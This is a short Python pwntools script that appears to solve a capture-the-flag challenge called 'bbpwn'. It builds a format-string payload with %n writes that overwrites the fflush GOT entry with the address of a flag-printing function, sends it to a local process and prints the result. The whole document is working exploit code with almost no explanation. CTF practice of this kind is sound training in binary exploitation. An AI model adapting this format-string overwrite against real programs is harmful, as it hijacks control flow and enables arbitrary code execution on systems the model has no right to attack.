from pwn import * 


p = process('./bbpwn')

#overwrite the value of the fflush address address with flag_addr
#0x80485c6
flag_addr = 0x0804870b
fflush_addr = 0x804a028

def low_bytes(addr):
  x = addr & 0xffff 
  return x

def high_bytes(addr):
  y = ((addr & 0xffff0000) >> 16) 
  return y



flag_high = high_bytes(flag_addr)
flag_low = low_bytes(flag_addr)


payload = p32(fflush_addr)
payload += p32(fflush_addr+2)
payload += '%10$11n' #clean  addr
payload += '%{}x%11$hn'.format(flag_high-0x4e)
payload += '%{}x%10$hn'.format(flag_low-flag_high)


p.recvuntil("Hello baby pwner, whats your name?\n")
p.sendline(payload)
pause()
print p.recvall()
#offset=10
#print hex(flag_addr & 0xffff)
#print hex ((flag_addr & 0xffff0000) >>16)







